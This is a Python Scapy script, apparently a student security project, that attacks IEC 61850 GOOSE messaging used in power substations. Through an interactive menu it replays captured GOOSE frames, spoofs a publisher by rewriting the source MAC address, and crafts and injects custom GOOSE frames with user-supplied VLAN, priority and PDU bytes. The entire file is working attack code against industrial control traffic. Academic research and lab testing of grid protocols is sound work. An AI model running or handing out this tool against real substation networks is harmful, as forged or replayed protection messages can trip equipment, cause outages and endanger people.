#############################################################################
# This is for MSSD Project Student ID 1007386
# Reference Goosestalker
############################################################################
import sys
import os
import time
from scapy.all import *
from scapy.layers.l2 import Ether, Dot1Q
from scapy.packet import Raw
import re

class GooseManager:
    def __init__(self, interface):
        self.interface = interface
        self.publisherMac = input("Enter the source MAC address (e.g., 08:00:27:ef:e1:ef): ")

    def replay_goose(self, pcap_file):
        if not os.path.exists(pcap_file):
            print("Error: File does not exist. Please ensure the pcap file has been created.")
            return
        print(f"Replaying GOOSE traffic from {pcap_file}")
        traffic = rdpcap(pcap_file)
        for frame in traffic:
            sendp(frame, iface=self.interface)
            time.sleep(0.01)

    def masquerade_goose(self, pcap_file, new_src_mac):
        if not os.path.exists(pcap_file):
            print("Error: File does not exist. Please ensure the pcap file has been created.")
            return
        print(f"Masquerading and replaying GOOSE traffic from {pcap_file}")
        traffic = rdpcap(pcap_file)
        for frame in traffic:
            frame[Ether].src = new_src_mac
            sendp(frame, iface=self.interface)
            time.sleep(0.1)

    def craft_and_send_custom_goose(self):
        vlan_id = int(input("Enter VLAN ID: "))
        priority = int(input("Enter Priority: "))
        multicast_mac = input("Enter Multicast MAC Address (e.g., 01:0C:CD:01:00:01): ")
        goose_pdu_hex = input("Enter GOOSE PDU in hexadecimal (e.g., 0101...): ")

        # Validate the GOOSE PDU
        if not re.fullmatch(r'[0-9a-fA-F]+', goose_pdu_hex):
            print("Invalid GOOSE PDU. It should be hexadecimal characters only.")
            return

        try:
            goose_pdu = bytes.fromhex(goose_pdu_hex)
        except ValueError as e:
            print(f"Error converting GOOSE PDU: {e}")
            return

        ether = Ether(dst=multicast_mac, src=self.publisherMac, type=0x8100)
        dot1q = Dot1Q(vlan=vlan_id, prio=priority, type=0x88b8)
        raw = Raw(load=goose_pdu)
        goose_frame = ether / dot1q / raw
        sendp(goose_frame, iface=self.interface)
        print("Custom GOOSE frame sent successfully.")

if __name__ == "__main__":
    interface = input("Enter the network interface name (e.g., eth0): ")
    manager = GooseManager(interface)

    options = {
        '1': lambda: manager.replay_goose(input("Enter the pcap filename to replay (e.g., capture_20210515_123000.pcap): ")),
        '2': lambda: manager.masquerade_goose(input("Enter the pcap filename for masquerading (e.g., capture_20210515_123000.pcap): "), input("Enter new source MAC address for masquerading: ")),
        '3': manager.craft_and_send_custom_goose,
        '0': sys.exit
    }

    while True:
        print("\nMenu:")
        print("[1] Replay GOOSE traffic")
        print("[2] Masquerade as a publisher")
        print("[3] Craft and send a custom GOOSE message")
        print("[0] Exit")
        choice = input("Please select your operation: ")

        action = options.get(choice)
        if action:
            action()
        else:
            print("Invalid selection. Please try again.")
